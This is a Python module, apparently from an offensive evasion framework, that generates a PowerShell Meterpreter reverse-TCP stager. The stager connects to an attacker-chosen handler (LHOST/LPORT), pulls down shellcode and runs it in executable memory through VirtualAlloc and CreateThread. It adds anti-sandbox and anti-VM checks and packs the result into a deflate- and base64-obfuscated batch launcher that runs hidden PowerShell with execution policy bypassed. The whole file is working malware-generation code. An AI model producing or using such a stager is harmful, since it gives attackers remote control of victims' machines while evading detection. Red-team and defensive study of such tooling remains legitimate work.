"""

Custom-written pure powershell meterpreter/reverse_tcp stager.

Module @harmj0y

"""

from Tools.Evasion.evasion_common import evasion_helpers
from Tools.Evasion.evasion_common import gamemaker


class PayloadModule:

    def __init__(self, cli_obj):
        # required options
        self.description = "pure windows/meterpreter/reverse_tcp stager, no shellcode"
        self.rating = "Excellent"
        self.language = "powershell"
        self.extension = "bat"
        self.name = "Pure PowerShell Reverse TCP Stager"
        self.path = "powershell/meterpreter/rev_tcp"
        self.cli_opts = cli_obj
        self.payload_source_code = ''
        if cli_obj.ordnance_payload is not None:
            self.payload_type = cli_obj.ordnance_payload
        elif cli_obj.msfvenom is not None:
            self.payload_type = cli_obj.msfvenom
        elif not cli_obj.tool:
            self.payload_type = ''
        self.cli_shellcode = False

        # optional
        self.required_options = {
            "LHOST" : ["", "IP of the Metasploit handler"],
            "LPORT" : ["4444", "Port of the Metasploit handler"],
            "HOSTNAME"       : ["X", "Optional: Required system hostname"],
            "DOMAIN"         : ["X", "Optional: Required internal domain"],
            "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
            "USERNAME"       : ["X", "Optional: The required user account"],
            "USERPROMPT"     : ["FALSE", "Window pops up prior to payload"],
            "MINRAM"         : ["FALSE", "Require a minimum of 3 gigs of RAM"],
            "UTCCHECK"       : ["FALSE", "Check that system isn't using UTC time zone"],
            "VIRTUALPROC"    : ["FALSE", "Check for known VM processes"],
            "MINBROWSERS"    : ["FALSE", "Minimum of 2 browsers"],
            "BADMACS"        : ["FALSE", "Checks for known bad mac addresses"],
            "MINPROCESSES"   : ["X", "Minimum number of processes running"],
            "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"]}

    def generate(self):
        checks, num_ends = gamemaker.senecas_games(self)
        baseString = """$c = @"
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr w, uint x, uint y, uint z);
[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr u, uint v, IntPtr w, IntPtr x, uint y, IntPtr z);
"@\n"""

        baseString += checks
        baseString += """try{$s = New-Object System.Net.Sockets.Socket ([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::Tcp)
$s.Connect('%s', %s) | out-null; $p = [Array]::CreateInstance("byte", 4); $x = $s.Receive($p) | out-null; $z = 0
$y = [Array]::CreateInstance("byte", [BitConverter]::ToInt32($p,0)+5); $y[0] = 0xBF
while ($z -lt [BitConverter]::ToInt32($p,0)) { $z += $s.Receive($y,$z+5,1,[System.Net.Sockets.SocketFlags]::None) }
for ($i=1; $i -le 4; $i++) {$y[$i] = [System.BitConverter]::GetBytes([int]$s.Handle)[$i-1]}
$t = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru; $x=$t::VirtualAlloc(0,$y.Length,0x3000,0x40)
[System.Runtime.InteropServices.Marshal]::Copy($y, 0, [IntPtr]($x.ToInt32()), $y.Length)
$t::CreateThread(0,0,$x,0,0,0) | out-null; Start-Sleep -Second 86400}catch{}""" %(self.required_options["LHOST"][0], self.required_options["LPORT"][0])

        baseString += '}\n' * num_ends
        print(baseString)

        encoded = evasion_helpers.deflate(baseString)

        payload_code = "@echo off\n"
        payload_code += "if %PROCESSOR_ARCHITECTURE%==x86 ("
        payload_code += "powershell.exe -NoP -NonI -W Hidden -Command \"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\\\"%s\\\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\"" % (encoded)
        payload_code += ") else ("
        payload_code += "%%WinDir%%\\syswow64\\windowspowershell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\\\"%s\\\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\")" % (encoded)

        self.payload_source_code = payload_code
        return
